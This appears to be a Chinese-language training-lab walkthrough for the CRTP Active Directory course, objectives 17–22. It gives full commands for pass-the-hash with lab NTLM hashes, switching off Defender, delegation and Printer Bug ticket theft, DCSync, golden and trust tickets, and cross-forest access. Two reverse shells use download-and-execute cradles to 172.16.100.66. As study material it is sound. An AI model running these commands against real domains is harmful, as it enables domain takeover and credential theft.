在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。

由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
```
appadmin:d549831a955fee51a43c83efb3928fa7
srvadmin:a98e18228819e8eec3dfa33cb68b0728
websvc：cc098f204c5887eaa8253e7c2749156f
```

分别对三个用户执行下面权限，得到一个该用户的新shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

由枚举结果可知，符合条件的只有appadmin



## Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.

### 方法一（DA令牌复用）

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）

![image-20220308205517843](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205517843.png)

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

横向到dcorp-appsrv，创建一个文件夹

用Mimikatz导出所有令牌，看看是否有Administrator的令牌

![image-20220308205741713](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205741713.png)



如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```



如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限

![image-20220308210032349](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210032349.png)



执行

```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;319074]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令

![image-20220308210230759](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210230759.png)

证明我们已经取得了DA权限

### 方法二（Printer Bug）

原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。

重新起一个appadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

把Rubeus.exe拷贝到dcorp-appsrv
```
Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```

![image-20220308210901421](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210901421.png)

开着rebuse.exe不要关闭

![image-20220308211329627](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308211329627.png)

回到学生机，执行下面命令

```
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT

![image-20220308211600888](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308211600888.png)

怎么利用TGT？

利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```

```
.\Rubeus.exe ptt /ticket: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
```



此时已经有了DA权限，尝试在DC上执行命令

```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```



![image-20220308212032876](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212032876.png)

# Learning Objective 18:
```Task
● Enumerate users in the domain for whom Constrained Delegation is enabled.
− For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
− Pass the ticket and access the service.
● Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
− For such a user, request a TGT from the DC.
− Obtain an alternate TGS for LDAP service on the target machine.
− Use the TGS for executing DCSync attack.
```



## Enumerate users in the domain for whom Constrained Delegation is enabled.

枚举约束委派的用户，需要用dev版本Powerview



![image-20220308212436558](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212436558.png)

留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统

由于我们之前已经枚举到了websvc的ntml哈希,这里直接利用

```
websvc：cc098f204c5887eaa8253e7c2749156f
```



### For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.

### 方法一：kekeo.exe
使用kekeo的 tgt::ask模块，向websvc请求一个TGT

![image-20220308212646066](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212646066.png)





现在我们有了TGT，向dcorp-mssql请求一个TGS。需要注意，这个TGS只有进入系统的权限，不能执行系统命令

```
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```



![image-20220308212844208](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212844208.png)

生成了一个TGS，使用Invoke-Mimikatz注入到内存当中

```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```



查看dcorp-mssql，看是否能列出文件列表（因为我们只有查看文件的权限）

```
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```



![image-20220308213010484](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213010484.png)





### 方法二：Rubeus.exe

使用rebuse滥用约束委托，可以在一条命令里请求TGT和TGS

```
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
```

![image-20220308213134134](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213134134.png)



查看dcorp-mssql的C盘,证明已经有进入dcorp-mssql的权限

```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```



![image-20220308213205735](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213205735.png)





## Enumerate computer accounts in the domain for which Constrained Delegation is enabled.

枚举约束委派的计算机，需要用dev版本Powerview

![image-20220308213522734](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213522734.png)



只有一台计算机：DCORP-ADMINSRV$

注意```msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}```

由于前面我们已经枚举到DCORP-ADMINSRV$的哈希，这里我们直接使用
```
DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
```



### 方法一：kekeo.exe

```
tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
```

![image-20220308213715680](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213715680.png)

已生成一个TGT，下面命令生成一个TGS

```
tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```



![image-20220308213857744](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213857744.png)

已生成一个TGS

下面命令利用mimikatz导入到内存中
```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

把TGS导入内存

klist查看

![image-20220308214039249](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214039249.png)

执行dcsync，导出dcorp\krbtgt的NTML哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

![image-20220308214144977](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214144977.png)

### 方法二：Rubeus.exe

用Rubeus.exe可以一条命令生成TGT和TGS

![image-20220308214248880](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214248880.png)



klist查看

![image-20220308214350414](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214350414.png)



使用Mimikatz执行dcsync导出dcorp\krbtgt的哈希

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

![image-20220308214435912](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214435912.png)



# Learning Objective 19:
```Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
```



假设已经知道DA管理员Administrator的哈希
```
Administrator: af0686cc0ca8f04df42210c9ac980760
```
打开一个具有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```



在DA权限的shell下枚举所有Trust tikets

![image-20220308215004889](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215004889.png)



伪造一条到父域```moneycorp.local```的TGT

从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt      98caa43e727f1dde097803e29ed0c37e```这个值

不能使用Administrator的NTML



伪造TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:98caa43e727f1dde097803e29ed0c37e /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
```

![image-20220308215508398](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215508398.png)

TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```

制作一张可以访问父域moneycorp.local的TGS

```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

![image-20220308215552249](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215552249.png)

将 TGS 呈现给目标服务

![image-20220308215621095](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215621095.png)

现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA

![image-20220308215648070](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215648070.png)

## 方法2 （Rubeus.exe）
样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试

```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

执行完成以后，访问父域的文件系统

```
ls \\mcorp-dc.moneycorp.local\c$
```

![image-20220308215802822](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215802822.png)



# Learning Objective 20:
```Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
```

下面命令制作一张用户krbtgt到父域的TGT
由于之前我们已经拿到了krbtgt的hash值，这里直接使用

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
```

![image-20220309204203132](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204203132.png)



TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
```



![image-20220309204255324](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204255324.png)

使用下面两个命令之一验证上面操作是否成功
```
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```
或者
```
ls \\mcorp-dc.moneycorp.local\c$
```

![image-20220309204343090](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204343090.png)



利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
```

收到反弹shell

![image-20220309204547148](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204547148.png)



# Learning Objective 21:
```Task
● With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
```

跨林访问（Across Forest）

用Administrator打开一个DA的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

枚举dcorp-dc的所有trust

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```



![image-20220309205036099](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205036099.png)



伪造一条到EUROCORP.LOCAL的TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:533b4264770857e124caf3b04fc5a503 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
```

注意上面的sids的参数是Enterprise Admins的MemberSID

![image-20220309205622261](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205622261.png)



执行

![image-20220309205653768](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205653768.png)



制作一张可以访问EUROCORP.LOCAL的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

查看目标计算机里的SharedwithDCorp文件夹
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

![image-20220309205854762](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205854762.png)

## 方法二（rebuse.exe）


同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

访问对方林中的计算机
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

![image-20220309210016147](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210016147.png)



# Learning Objective 22:
```Task
● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
```

```
PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 
```



![image-20220309210640825](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210640825.png)



或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）

```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
```

![image-20220309210754615](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210754615.png)



只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible

手动枚举mssql链接

```
 Get-SQLServerLinkCrawl -Instance dcorp-mssql 
```

![image-20220309210903705](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210903705.png)

下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
```

![image-20220309210955376](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210955376.png)

下面命令触发一个反弹shell
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

![image-20220309211203376](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309211203376.png)